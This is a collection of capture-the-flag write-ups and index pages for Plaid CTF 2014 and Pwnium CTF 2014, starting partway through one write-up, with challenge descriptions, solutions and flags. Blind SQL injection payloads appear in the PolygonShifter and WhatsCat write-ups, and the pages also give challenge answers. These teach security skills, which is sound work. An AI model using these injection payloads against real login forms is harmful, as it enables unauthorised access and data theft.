        <input type="text" id="6lyNestBnznos6FxGtGD" name="dVURHUzXGy69u5thdZY0">
        <label for="bFixmywlQhbkX1uC1oI2" style="text-align:left;">Password</label>
        <input type="password" id="bFixmywlQhbkX1uC1oI2" name="SU8IPPqzwozVlQzuaWSA">
        <input class="primary large" type="submit" value="Login">
    </form>
</div>
```

Okay, we cannot use the `id`s or `name`s of these fields to automate the process since they change for every request. No problem — we don’t really need those anyway. The source code doesn’t seem to have any more input fields, so we can just input our username in whatever’s the first input field on the page, and the password into the second field.

```js
var arr = document.getElementsByTagName('input');
arr[0].value = 'admin';
arr[1].value = "' or (password LIKE '%a%') and 1='1";
```

If we manage to successfully log in as admin using these values, we know that our query succeeded and that there’s an `a` in the password. Using a similar technique, we can slowly figure out the password character by character (cfr. [the WhatsCat challenge write-up](https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/whatscat)).

We wrote a [PhantomJS](http://phantomjs.org/) script for this named [`client.js`](client.js). Run it as follows:

```bash
$ phantomjs client.js "(password like 'a%')"
```

After some testing, we find that the flag is `n0b0t5\_C4n\_bYpa5s\_p0lYm0rph1Sm`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/04/plaidctf-2014-polygonshifter-writeup.html>
* <https://ucs.fbi.h-da.de/writeup-plaidctf-2014-polygonshifter/>
* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-100-blind-sql-injection>
* <http://eindbazen.net/2014/04/plaidctf-2014-polygonshifter-100/>
* <http://sigint.ru/writeups/2014/04/13/plaidctf-2014-writeups/#web-100---polygonshifter>
# Plaid CTF 2014

* [Main website](http://play.plaidctf.com/)
* [Scoreboard](http://play.plaidctf.com/scoreboard) or [local alternative](scoreboard.txt)
* [@PlaidCTF on Twitter](https://twitter.com/PlaidCTF)
* [Plaid CTF 2014 @ CTFTime.org](https://ctftime.org/event/119)
* [Source code for some of the challenges](https://github.com/pwning/plaidctf2014) (released after the CTF; not needed to solve the challenges)

## Completed write-ups

* [curlcore](curlcore)
* [doge\_stege](doge-stege)
* [g++](g)
* [graphs](graphs)
* [halphow2js](halphow2js)
* [Heartbleed](heartbleed)
* [kpop](kpop)
* [mtpox](mtpox)
* [Multiplication is hard](multiplication-is-hard)
* [paris](paris)
* [PolygonShifter](polygonshifter)
* [rsa](rsa)
* [Sanity check](sanity-check)
* [twenty](twenty)
* [WhatsCat](whatscat)

## External write-ups only

* [bbos](bbos)
* [bronies](bronies)
* [ezhp](ezhp)
* [freya](freya)
* [gcc](gcc)
* [harry-potter](harry-potter)
* [hudak](hudak)
* [jackshit](jackshit)
* [kappa](kappa)
* [nightmares](nightmares)
* [parlor](parlor)
* [reeekeeeeee](reeekeeeeee)
* [rendezvous](rendezvous)
* [sass](sass)
* [tenement](tenement)
* [tiffany](tiffany)
* [wheeeee](wheeeee)
* [zfs](zfs)

## Missing write-ups

* [moscow](moscow)
# Plaid CTF 2014: reeekeeeeee

**Category:** Web
**Points:** 200
**Description:**

> The Plague seems obsessed with internet memes, though we don't yet know why. Perhaps there is a clue to what he's up to on [this server](http://54.82.251.203:8000/) (epilepsy warning). If only you could break in.... [Here](reekee-d45a5cec85c467ed9a21934b871a88d1.tar.bz2) is some of the source.

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/04/plaidctf-2014-reeekeeeeee-writeup/>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/reekee)
* <https://github.com/hackerclub/writeups/blob/master/plaidctf-2014/reeekeeeeee/WRITEUP-pipecork.md>
* <http://security.cs.pub.ro/hexcellents/wiki/writeups/pctf2014_reekee>
* <https://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.html>
* <http://blog.dragonsector.pl/2014/04/plaidctf-2014-kpop-and-reeekeee.html>
* <https://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/>
# Plaid CTF 2014: rendezvous

**Category:** Misc
**Points:** 250
**Description:**

> The Plague has a friend called Alice who has some secrets on [a Tor service](http://6c4dm56aer6xn2h2.onion/). We think if we can talk to her, we can learn some useful things about The Plague. Unfortunately she will only rendezvous with "chandler" when he brings a cookie with "beef" baked into it. Can you help us find her secret?

## Write-up

(TODO)

The flag is `flag{why_you_so_damn_creepy}`.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-misc250-rendezvous.html>
* [Tor patch for this challenge](https://gist.github.com/anonymous/21998734ea157023dbae) by @foundation
# Plaid CTF 2014: rsa

**Category:** Forensics
**Points:** 450
**Description:**

> Our archaeologists recovered a dusty and corrupted old hard drive used by The Plague in his trips into the past. It contains a private key, but this has long since been lost to bitrot. Can you recover the full key from the [little information we have recovered](rsa-6537e9aae493b0c43601d1dbc2da2ce2.tar.bz2)?

## Write-up

_This write-up is made by Steven of the [HacknamStyle](http://hacknamstyle.net/) CTF team._

After some Googling, a tool can be found to recover corrupted RSA private keys, linked to the paper [_Reconstructing RSA Private Keys from Random Key Bits_ by Nadia Heninger and Hovav Shacham](http://cseweb.ucsd.edu/~hovav/papers/hs09.html).

The `rsabits` tool takes a corrupted private and public key as input, and then recovers the missing bits. To distinguish actual vs. missing bits, `rsabits` uses a ‘mask’ where an ‘on’ bit means ‘known’ and an ‘off’ bit means ‘unknown’. Since this is an academic prototype, the code needs [some patching to actually output the recovered private key](rsabits.patch).

The input file for `rsabits` consists of two parts: the public key information and the private key information.

The modulus and exponent of the public key can be extracted using the following command:

```bash
$ cat public.pub | grep -v -- ----- | tr -d '\n' | base64 -d | openssl asn1parse -inform DER -i -strparse 18
0:d=0  hl=3 l= 137 cons: SEQUENCE
3:d=1  hl=3 l= 129 prim:  INTEGER           :DBFABDB1495D3276E7626B84796E9FC20FA13C1744F10C8C3F3E3C2C6040C2E7F313DFA3D1FE10D1AE577CFEAB7452AA53102EEF7BE0099C022560E57A5C30D50940642D1B097DD2109AE02F2DCFF8198CD5A395FCAC4266107848B9DD63C387D2538E50415343042033EA09C084155E652B0F062340D5D4717A402A9D806A6B
135:d=1  hl=2 l=   3 prim:  INTEGER           :010001
```

The bits of the private key can be extracted from the corrupted file after some text-fiddling and converting the hex values to
decimal using `ibase 16` in `bc`.

The final `rsabits` input file can be found in [`input-numbers.txt`](input-numbers.txt), which is fed to the `rsabits` tool:

```bash
$ ./rsa -i input-numbers.txt
```

The tool will print out values for `P` and `Q`:

```
12643740637395110652894262209502063899047520218436247735878188180335985789877601396069401620713231058940443043891453952791936466967524033214476598572706213
12217494205780318874865198006759446969679921137474855298485716817925925911890415286181103665676748660959871257808447814451048738105000263500773868071134927
```

…which can then be converted into a private key using [`rsatool.py`](https://github.com/ius/rsatool/blob/master/rsatool.py):

```bash
$ ./rsatool.py -p 12643740637395110652894262209502063899047520218436247735878188180335985789877601396069401620713231058940443043891453952791936466967524033214476598572706213 -q 12217494205780318874865198006759446969679921137474855298485716817925925911890415286181103665676748660959871257808447814451048738105000263500773868071134927 -o recovered.key
```

[The resulting key](recovered.key) can then be used to decrypt the given ciphertext:

```bash
$ openssl rsautl -decrypt -in ciphertext -out plaintext -inkey recovered.key
```

…which reveals the flag `crypt0>>>f0rensics3~`.

## Other write-ups and resources

* [Write-up by More Smoked Leet Chicken](http://mslc.ctf.su/wp/plaidctf-2014-rsa-writeup/)
* [Write-up by fail0verflow](https://fail0verflow.com/blog/2014/plaidctf2014-for450-rsa.html)
* [Reconstructing RSA private keys from random key bits](http://cseweb.ucsd.edu/~hovav/papers/hs09.html)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/forensics/rsa)
* [Indonese](http://blog.rentjong.net/2014/04/plaidctf2014-write-up-rsaforensic450.html)
# Plaid CTF 2014: Sanity check

**Category:** Misc
**Points:** 1
**Description:**

> The key is poop

## Write-up

They aren’t kidding. The flag is literally `poop`.

## Other write-ups and resources

* <https://github.com/hackerclub/writeups/tree/master/plaidctf-2014/Sanity-check>
* <http://csrc.tamuc.edu/css/?p=152>
# Plaid CTF 2014: sass

**Category:** Pwnables
**Points:** 200
**Description:**

> Not all of The Plagues services seem secure. Getting into [this one](sass-3b23e61c9defaf34f7111ba425f12208.gz), might give us some clues as to when he is planning to time jump to next. The service is at 54.198.50.139:5455; you may also want to `ssh` to `ctf@54.198.50.139` (password: `ctf`) to debug your exploits in the local environment. Read the `README_SASS` there!

## Write-up

(TODO)

## Other write-ups and resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/sass)
* <http://j00ru.vexillium.org/dump/ctf/sass.py>
* <http://pastebin.com/zXeUKdNG>
# Plaid CTF 2014: tenement

**Category:** Pwnables
**Points:** 100
**Description:**

> The Plague has tried to make things easy for you in [this service](tenement-38db26ad2799801263a066a831526836.tar.bz2), but not too easy. He's called The Plague, not The Nice Guy. The service should be running at 54.235.7.236:9999.

## Write-up

(TODO)

The flag is `Wub-a-lubba-dub-dub`.

## Other write-ups and resources

* <https://cesena.ing2.unibo.it/2014/04/15/plaidctf-2014-tene-pwn-100/>
* <http://nullify-ctf.blogspot.com/2014/04/pwnables-100-tenement-plaidctf-2014.html>
* <http://eindbazen.net/2014/04/plaidctf-2014-tenement-100/>
* <http://j00ru.vexillium.org/dump/ctf/tenement.zip>
# Plaid CTF 2014: tiffany

**Category:** Reversing
**Points:** 300
**Description:**

> We want to get access to a server used by The Plague. Maybe if you can find out what key is accepted by [this binary](tiffany-0233a625fc40b2dda9c31781a0dbb46e.tar.bz2) you can find out where or when The Plague is...
>
> Hint: each instance does a very simple thing.

## Write-up

(TODO)

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-re300-tiffany.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/reversing/tiffany)
* <http://blog.dragonsector.pl/2014/04/plaid-ctf-2014-tiffany-writeup.html>
# Plaid CTF 2014: twenty

**Category:** Crypto
**Points:** 20
**Description:**

> It’s so far in the past, computers haven’t even been imagined, let alone used. But somehow The Plague has already been here, building an evil army of hackers. Can you find his [secret message](twenty-c870a2814484278ecd90c21f35cd45ae.tar.bz2)?

## Write-up

After extracting the tarball we end up with a file named `twenty.txt` with the following contents:

```
fvoxoxfvwdepagxmwxfpukleofxhwevefuygzepfvexwfvufgeyfryedojhwffoyhxcwgmlxeylawfxfurwfvoxecfezfvwbecpfpeejuygoyfefvwxfpwwfxojumwuxfuffvwawuxflecaazubwjwoyfvwyepfvwuxfhwfjlopwckaohvfjlzopwoaahevupgwpfvuywjoywjdwyfufjupouvbuaajwuaoupkecygjwoyfvwuxxdofvyeacmwbvuzoyhlecpwzcbroyhdofvfvwgcgwdveheffvwrwlxfelecpxuzwuygfvexwfvufbuyfgempoyhxcofxbplfelecpcybawxujfexwffawgoxkcfwxfvechvflecgfubrawfvoxdofvuaoffawjepwfubfmcffvwyuhuoyzcghwkubrwpxogeyfryediubroxvwgufwupwswplfojwofvoyrezaorxuyhmcfxvofjuyfvwlpwubepkepufoeyuygojukwpxeyozobufoeyezzpwwgejzepuaaleczoaagebrwfxaorwfvufxubeybwkfzepwohyfeluaadvoawaudlwpxjcggldufwpuygfpexxfuaaecfezmcxoywxxoxiuoazepjwuyglecpwxcoyhjwbosoaalwnvomoffvoxoyfvwbecpfpeejheeygeofogupwlecbeyhpufcaufoeyxfvwzauhoxxoybwywdbplkfejohvfvuswyxumubrgeepxocxweagbplkfe
```

The string is encoded using a Vigenère cipher: each letter of the alphabet represents a number from 0 to 25. The key is added to the original message to form the decoded message. Since the message is usually longer than the key it is necessary to duplicate the key until it reaches the length of the original message. To decode the message, the key is subtracted from the decoded message to obtain the original message.

[`cipher_solver.py`](cipher_solver.py) uses an implementation of the hill climbing algorithm to calculate the key. It is assumed that the key is a permutation of all the letters of the alphabet. The algorithm starts with the key `ABC…Z` and calculates the decoded message. The `ngram_score` module is used to calculate the score of this decoded string. `ngram_score` uses `quadgrams.txt` which is a file that lists all combinations of 4 characters and their occurence frequency in the English language.

By searching the decoded string for these n-grams it is possible to calculate a score for the decoded string. If this decoded strings score is higher (resembled the English language better) than the previous score, this key is presumed to be closer to the final key and it will be used in the next iteration of the hill climbing algorithm.

For each iteration, two characters are swapped and the previously explained process is repeated until the user stops the program or the score of the decoded string exceeds `maxscore`.

This delivered the correct decoded string which contained the flag.

The flag is `sincenewcryptomighthavensabackdoorsiuseoldcrypto`.

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-plaidctf-2014-twenty/>
* <https://docs.google.com/a/google.com/document/d/1WthFuKx3sAtqTVPOklVJt12MMS3lrxITGglskPKNtL8/edit>
* <http://csrc.tamuc.edu/css/?p=169>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/crypto/twenty)
* <https://github.com/hackerclub/writeups/blob/master/plaidctf-2014/twenty/WRITEUP-arthurdent.md>
* [Indonese](http://blog.rentjong.net/2014/04/plaidctf2014-write-up-twenty-crypto20.html)
# Plaid CTF 2014: WhatsCat

**Category:** Web
**Points:** 300
**Description:**

> The Plague is using his tremendous talent for web applications to build social websites that will get bought out for billions of dollars. If you can stop his climb to power now by showing how insecure [this site really is](http://54.196.116.77/), (on IPv6 at 2001:470:8:f7d::1) maybe we will be able to stop his future reign of terror. [Here](whatscat-59b6f6c9b192457fa3e7d2253c8b24c9.tar.bz2)'s some of his source.

## Write-up

The source code in the tarball has a SQL injection vulnerability in the `login` file.

```php
$pwnew = "cat".bin2hex(openssl_random_pseudo_bytes(8));
if ($res) {
  echo sprintf("<p>Don't worry %s, we're emailing you a new password at %s</p>",
    $res->username,$res->email);
  echo sprintf("<p>If you are not %s, we'll tell them something fishy is going on!</p>",
    $res->username);
$message = <<<CAT
Hello. Either you or someone pretending to be you attempted to reset your password.
Anyway, we set your new password to $pwnew

If it wasn't you who changed your password, we have logged their IP information as follows:
CAT;
  $details = gethostbyaddr($_SERVER['REMOTE_ADDR']).
    print_r(dns_get_record(gethostbyaddr($_SERVER['REMOTE_ADDR'])),true);
  mail($res->email,"whatscat password reset",$message.$details,"From: whatscat@whatscat.cat\r\n");
  mysql_query(sprintf("update users set password='%s', resetinfo='%s' where username='%s'",
          $pwnew,$details,$res->username));
}
else {
  echo "Hmm we don't seem to have anyone signed up by that name";
}
```

There’s no way the generated value of `$pwnew` could ever contain `'`, so we can’t use that as part of the exploit. The same goes for the user’s IP address (`$_SERVER['REMOTE_ADDR']`).

However, `dns_get_record(gethostbyaddr($_SERVER['REMOTE_ADDR']))` is also used in the query without proper escaping. So we could get a server, change its [DNS PTR record](http://en.wikipedia.org/wiki/Reverse_DNS_lookup) so the server IP points to a domain name under our control, and configure a TXT record that contains a SQL injection payload on that domain. [Alexey Kaminsky has a write-up detailing this solution.](http://akaminsky.net/plaidctf-quals-2014-web-300-whatscat/) Alternatively, you could set up your own DNS server for this challenge, and have it automatically inject TXT records with the payload, [like @phiber did](https://gist.github.com/anonymous/ea292c8dc60a2d8fba50).

Another option is to hide the SQL injection payload in the username. The downside of this approach is that since the username is reflected in the `WHERE` clause of the query, only blind SQL injection is possible. Still, it’s possible to slowly leak data:

1. Register with username `foo`.
2. Register with username `foo' and 21=(select length(flag) from flag)#`.
3. Request a password reset for the second user.
4. Log in with the first username and its original password. If the password is rejected, then the condition in the payload (in this case `21 == length(flag)` is true, else it’s false.

After discovering the table and column name where the flag is hidden (they’re both `flag`), we can repeat this process to figure out what the flag is, one character at a time. For example, the username `foo' and (select ascii(substr(flag,1,1) from flag) between 97 and 122#` can be used to find out if the first character of the flag is a lowercase letter in the `[a-z]` range or not.

@ngocdh wrote [a neat solution in Python](https://gist.github.com/anonymous/f4e884a234ba5d3c9d37) that uses a clever implementation of this technique: it uses binary search to decrease the time needed to find the correct character.

The flag is `20billion_d0llar_1d3a`.

## Other write-ups and resources

* [Write-up by Alexey Kaminsky](http://akaminsky.net/plaidctf-quals-2014-web-300-whatscat/)
* [Write-up by Tasteless](http://tasteless.eu/2014/04/plaidctf-2014-whatscat-writeup/)
* [Write-up by Ron Bowes](https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns)
* [Python solution that figures out the flag character by character, by @ngocdh](https://gist.github.com/anonymous/f4e884a234ba5d3c9d37)
* [Custom DNS server to perform SQL injection through rDNS records, by @phiber](https://gist.github.com/anonymous/ea292c8dc60a2d8fba50)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/whatscat)
# Plaid CTF 2014: wheeeee

**Category:** Crypto
**Points:** 375
**Description:**

> Although it seems like The Plague's messaging service is secure, there are bound to be bugs in any 20th century crypto system. We've recovered [a version](wheeeee-8aa05f8827f5ece6a27c021eae46d118.tar.bz2) of the block cipher The Plague implemented. Use their online encryptor tool, at 54.82.75.29:8193, to break the cipher and figure out Plague's secret plans.
>
> NOTE: When the service sends you a hex-encoded string, respond with a hex-encoded string.

## Write-up

(TODO)

## Other write-ups and resources

* <http://mslc.ctf.su/wp/plaidctf-2014-wheeeee-writeup/>
* <https://fail0verflow.com/blog/2014/plaidctf2014-crypto375-wheeeee.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/crypto/wheeeeeeeeeeeeeeeeeeeeeee)
# Plaid CTF 2014: zfs

**Category:** Forensics
**Points:** 400
**Description:**

> The Plague is using state of the art systems for storing his data. Our operatives managed to steal [a drive](zfs-ff06f37193caa92456e9c03090c80600.tar.bz2) from one of his servers, but it seems like our haste may have led to some uber-corruption. Can you get the data off the drive to track down The Plague?

## Write-up

(TODO)

The flag is `ZFS_daTa_1s_s4f35t_d4t4`.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-for400-zfs.html>
* <https://ctftime.org/writeup/1083>
* <https://vanned.info/zfs.html>
# Pwnium CTF 2014: 2048

**Category:** Programming
**Points:** 200
**Description:**
> Reach the 2048 tile in less than 3:30 minutes nc 41.231.53.40 2048

## Write-up

(TODO)

## Other write-ups and resources
* <http://0xawes0me.github.io/writeups/2014/07/19/2048/>
* <http://krebsco.de/writeups/2048.html>
# Pwnium CTF 2014: Altered code

**Category:** Stegano
**Points:** 150
**Description:**
> Our Spy got spotted in Japan, but before they catch him he send us this file. find out the secret code hidden in the code. [http://41.231.53.40/main.c](main.c)

## Write-up

Written by Tasteless for ctftime.org

> We got a C source code. If we look carefully at it we will notice that some 
lines are indented with tabs while others are indented with spaces.The solution 
is just to comment or delete the lines indented with tabs and execute the code 
to get the flag.

```Flag: D0nT_e4t_Sushi```

Source: https://ctftime.org/writeup/1177

## Other write-ups and resources

* <http://blog.dul.ac/2014/07/PWNIUM14/>
* <http://pastebin.com/kr6uDrN3>
* <https://crazybulletctfwriteups.wordpress.com/2014/07/08/pwnium-ctf-2014-alter-code/>
* <https://ctftime.org/writeup/1177>
# Pwnium CTF 2014: Baybe crackme

**Category:** Reverse
**Points:** 10
**Description:**
> a baybe crackme [http://41.231.53.44/tasks/re10.zip](re10.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/1158>
# Pwnium CTF 2014: Be a robot

**Category:** Reverse
**Points:** 200
**Description:**
> Get a Shell ssh pwn200@41.231.53.42 password: pwn200

## Write-up


## Other write-ups and resources

* <http://v0ids3curity.blogspot.in/2014/07/pwnium-ctf-2014-pwn-200-team-segfault.html>
* <https://takt0rs.wordpress.com/2014/07/09/pwnium-2014-pwn200/>
* <http://krebsco.de/writeups/be-a-robot.html>
# Pwnium CTF 2014: Breakpoints

**Category:** Reverse
**Points:** 300
**Description:**
> Find the password [http://41.231.53.44:8282/tasks/re300.zip](re300.zip)

## Write-up

(TODO)

## Other write-ups and resources

* [SkUaTeR](https://infotomb.com/fg0c5.pdf)
* [s0beit](http://s0beit.me/reverse-engineering/pwnium-write-up-2-breakpoints/)
* <http://v0ids3curity.blogspot.in/2014/07/pwnium-ctf-2014-breakpoints-re-300-team.html>
* [Japanese](http://ctf-infinit.tumblr.com/post/90950477790/pwnnium-ctf-2014-writeup-breakpoints-reverse#_=_)
# Pwnium CTF 2014: break_me

**Category:** Crypto
**Points:** 100
**Description:**
> QlpoOTFBWSZTWTxSmOAAAAsJAF/gOwAgADEAAAiZMNT0JbKzhCQcyQtA2gNbvXgSvxdyRThQkDxSmOA=

## Write-up

We are give with the string that clearly indicates base64 encoding ('=' at the end).
After processing the string with the `base64` command and `file`

    echo 'QlpoOTFBWSZTWTxSmOAAAAsJAF/gOwAgADEAAAiZMNT0JbKzhCQcyQtA2gNbvXgSvxdyRThQkDxSmOA=' | base64 -D > output
    file output
    
we get:
> output: bzip2 compressed data, block size = 900k

After we `unbzip2` it we get the output:
> 9afa828748387b6ac0a393c00e542079

which is the flag.

## Other write-ups and resources

* <https://ctftime.org/writeup/1154>
* <http://krebsco.de/writeups/crack-me.html>
* <https://crazybulletctfwriteups.wordpress.com/2014/07/07/pwnium-ctf-2014-break-me/>
# Pwnium CTF 2014: Crackme fast

**Category:** Programming
**Points:** 300
**Description:**
> Crackme Fast The binary http://41.231.53.44:9393/ Send the password in less than 2 seconds http://41.231.53.44:9393/check.php?p={p@55}

## Write-up

(TODO)

## Other write-ups and resources

* <https://s0beit.me/reverse-engineering/pwnium-write-up-1-crackme-fast/>
* <http://krebsco.de/writeups/crackme-fast.html>
# Pwnium CTF 2014: Find the owner

**Category:** Forensics
**Points:** 100
**Description:**
> [http://41.231.53.40/Forensics100.zip](Forensics100.zip) flag format == Pwnium{md5[ip:port]} **Be careful this file may harm your computer**

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.dul.ac/2014/07/PWNIUM14/>
* <https://crazybulletctfwriteups.wordpress.com/2014/07/07/pwnium-ctf-2014-find-the-owner/>
* <https://ctftime.org/writeup/1156>
# Pwnium CTF 2014: Guest book

**Category:** Web
**Points:** 200
**Description:**
> Fin the key ! http://41.231.53.43:8383/

## Write-up


## Other write-ups and resources
* <http://0xawes0me.github.io/writeups/2014/07/19/guestbook/>
# Pwnium CTF 2014: is_empty()?

**Category:** Misc
**Points:** 100
**Description:**
> empty empty empty [http://41.231.53.44/tasks/misc100.zip](misc100.zip)

## Write-up


## Other write-ups and resources


# Pwnium CTF 2014: Kernel Land

**Category:** Reverse
**Points:** 150
**Description:**

> The third Tick gives you the answer ;) [http://41.231.53.40/kernel](kernel)

## Write-up

The algorithm is described in `timer_tick` and the data is in the global variable `flag`.

Calculate the flag as follows:

```python
flag_data =[
0x49, 0x74, 0x6F, 0x66, 0x72, 0x6A, 0x78, 0x62, 0x32, 0x60, 0x2E,
0x2E, 0x63, 0x2E, 0x32, 0x2E, 0x36, 0x30, 0x33, 0x31, 0x5D, 0x67,
0x36, 0x62, 0x31, 0x67, 0x67, 0x30, 0x5E, 0x29, 0x62, 0x31, 0x31,
0x63, 0x62, 0x5E, 0x5E, 0x2D, 0x5D, 0x7A]

for i in range(1, 4):
    for x in range(len(flag_data)):
        flag_data[x] = ((flag_data[x]^i)+1) % 256

print "".join(map(chr, flag_data))
```

## Other write-ups and resources

* <http://blog.randomguys.fr/pwnium2014-kernel-land.html>
* <https://in3o.wordpress.com/2014/07/06/pwnium-ctf-2014-reverse-150-kernel-land/>
# Pwnium CTF 2014: Look closer

**Category:** Misc
**Points:** 50
**Description:**

> [http://41.231.53.40/Misc1.rar](Misc1.rar)

## Write-up

We are given the `Misc1.rar` file that fails to open as an archive. If we run the `file` command it is actually identified as `JPEG` file:

```bash
$ file Misc1.rar
Misc1.rar: JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJ"
```

Let’s give it a proper file extension:

```bash
$ mv Misc1.rar Misc1.jpeg
```

…and open it. If we look close enough, we can read the flag:

![](flag.png)

The flag is:

```
Pwnium{361a8212dda49824b8fdb70ce48f2f60}
```

## Other write-ups and resources

* <https://ctftime.org/writeup/1157>
* <https://crazybulletctfwriteups.wordpress.com/2014/07/07/pwnium-ctf-2014-look-closer/>
# Pwnium CTF 2014: main()

**Category:** Misc
**Points:** 1
**Description:**

> Flag this : h4ck_Th3_Pl@n3T

## Write-up

The flag is: `h4ck_Th3_Pl@n3T`.

## Other write-ups and resources

* none yet


# Pwnium CTF 2014: Matter of combination

**Category:** Stego
**Points:** 150
**Description:**
> Find the best combination to retrieve the Flag [http://41.231.53.40/Steg75.zip](Steg75.zip)

## Write-up


## Other write-ups and resources

* <http://0xawes0.me/writeups/2014/07/26/stego75-pwnium/>
# Pwnium CTF 2014: NoDebug

**Category:** Reverse
**Points:** 200
**Description:**
> [http://41.231.53.44/tasks/re200.zip](re200.zip)

## Write-up

(TODO)

## Other write-ups and resources

* [Spanish](https://infotomb.com/z0xp5)
* [Chinese](http://loccs.sjtu.edu.cn/typecho/index.php/archives/239/)
# Pwnium CTF 2014: Numbers and sh*t

**Category:** Misc
**Points:** 200
**Description:**
> Find the Flag [41.231.53.40/Misc100.zip](Misc100.zip)

## Write-up


## Other write-ups and resources


# Pwnium CTF 2014: Old World

**Category:** Reverse
**Points:** 100
**Description:**
> Fond the flag [http://41.231.53.44:8282/tasks/re100.zip](re100.zip)

## Write-up

(TODO)

## Other write-ups and resources
* <https://in3o.wordpress.com/2014/07/06/pwnium-ctf-2014-reverse-100-old-school/>
# Pwnium CTF 2014: problem ?

**Category:** Hidden
**Points:** 100
**Description:**

> Find the hidden flag

## Write-up

As reported by Tasteless on <https://ctftime.org/writeup/1178>:

> The flag is the last row in the scoreboard (it is different from  the others because there is no link to the team profile).

## Other write-ups and resources

* <https://ctftime.org/writeup/1178>
# Pwnium CTF 2014: pwn100

**Category:** Pwn
**Points:** 100
**Description:**
> 

## Write-up

(TODO)

## Other write-ups and resources

* <https://welovecpteam.wordpress.com/2014/07/06/pwnium-pwn100/>
# Pwnium CTF 2014

* [Main website](http:/ctf.pwnium.tn/)
* [Scoreboard](http://41.231.53.44:8282/scoreboard) or [local alternative](scoreboard.txt)

## Completed write-ups

* [Altered Code](altered-code)
* [BreakMe](break_me)
* [Kernel Land](kernel-land)
* [Look Closer](look-closer)
* [main()](main)
* [problem ?](problem)
* [So basic](so-basic)
* [USB is fun](usb-is-fun)

## External write-ups only

* [2048](2048)
* [Baybe Crackme](baybe-crackme)
* [Be a robot](be-a-robot)
* [Breakpoints](breakpoints)
* [Crackme Fast](crackme-fast)
* [Find the owner](find-the-owner)
* [Guest Book](guest-book)
* [Matter of combination](matter-of-combination)
* [NoDebug](nodebug)
* [Old World](old-world)
* [pwn100](pwn100)
* [ROT](rot)
* [XWebSite](xwebsite)

## Missing write-ups

* [is\_empty ?](is_empty)
* [Numbers and sh\*t](numbers-and-shit)
* [Remote KG](remote-kg)
# Pwnium CTF 2014: Remote KG

**Category:** Misc
**Points:** 250
**Description:**
> Find the pass for the user Pwnium [http://41.231.53.44:8282/tasks/misc250.zip](misc250.zip)

## Write-up


## Other write-ups and resources


# Pwnium CTF 2014: ROT

**Category:** Programming
**Points:** 300
**Description:**
> Rot 90, Rot -90, Rot 90, Rot -90... nc 41.231.53.40 9090

## Write-up

(TODO)

## Other write-ups and resources

* <https://infotomb.com/1e6d4.pdf>
* <https://adarshdinesh.wordpress.com/2014/07/06/pwnium-ctf-2014-programming-300/>
* <http://krebsco.de/writeups/rot.html>
* <https://ctftime.org/writeup/1166>
# Pwnium CTF 2014: So basic

**Category:** Misc
**Points:** 75
**Description:**
> Find the Flag (75 pts) [http://41.231.53.40/Misc75.zip](Misc75.zip)

## Write-up

We are given several (39) files with a md5sum as fiename and two characters, a hex byte, as the content of each file.

If we concat all files and decode it from hex to ascii, we get something that is not quite right:

```bash
$ cat * | sed 's/\\x//g' | xxd -r -p
c{352dc0cf9c7efdf560dbb5ued17we7n2Pe}emi
```

We see an upper case `P` as well as an opening and closing curly brace `{`/`}`, so this might be our flag, just not in the right order.

Though we could theroetically bruteforce the flag, we might have to submit each created flag, so that is not a proper solution.

However, we still have the md5sums as filenames. If we decrypt one or two of these md5sums, e.g. with an [online md5 cracker](md5online.org), we quickly see that these are the numbers in the range `0-39`.

So lets concat the hex bytes in the given order according to the md5sum cleartext:

```bash
$ for i in {0..39}; do cat `echo -n $i | md5` | gsed 's/\\x//g' | xxd -r -p; done
Pwnium{02cef7eeb75fdd9dfc67c0dc1e3e255b}
```

Looks like our flag is `Pwnium{02cef7eeb75fdd9dfc67c0dc1e3e255b}`.

## Other write-ups and resources

* <https://crazybulletctfwriteups.wordpress.com/2014/07/07/pwnium-ctf-2014-so-basic/>
* <http://scrubsec.com/2014/07/06/pwnium-ctf-so-basic-75-pts/>
* <https://ctftime.org/writeup/1159>
* <http://blog.dul.ac/2014/07/PWNIUM14/>
# Pwnium CTF 2014: USB if fun

**Category:** Forensics
**Points:** 100
**Description:**
> [http://41.231.53.40/for1.pcapng](for1.pcapng)

## Write-up

We have a packetdump containing USB(MS) packets. The first thing to do is always throw a `strings` and `grep` combination at a given file. Just in case.

```bash
$ strings -a for1.pcapng | grep -i Pwnium
Pwnium{408158c115a82175de37e8b3299d1f93}
```

Wuuaaat? Ok that is easy. Our flag is `Pwnium{408158c115a82175de37e8b3299d1f93}`.

## Other write-ups and resources

* <https://crazybulletctfwriteups.wordpress.com/2014/07/07/pwnium-ctf-2014-usb-so-fun/>
* <https://ctftime.org/writeup/1155>
* <http://krebsco.de/writeups/for1-usb-dump.html>
# Pwnium CTF 2014: XWebSite

**Category:** Web
**Points:** 100
**Description:**
> Find the key http://41.231.53.44/web100/index.php

## Write-up

(TODO)

## Other write-ups and resources

* [*OpenToAll*](https://ctftime.org/writeup/1160)
# Qiwi CTF 2014: Bajutsu

**Category:** Pwn
**Points:** 100
**Author:** pzbitskiy
**Description:**

> cat flag on port 2222 at qiwictf2014.ru

## Write-up

(TODO)

## Other write-ups and resources

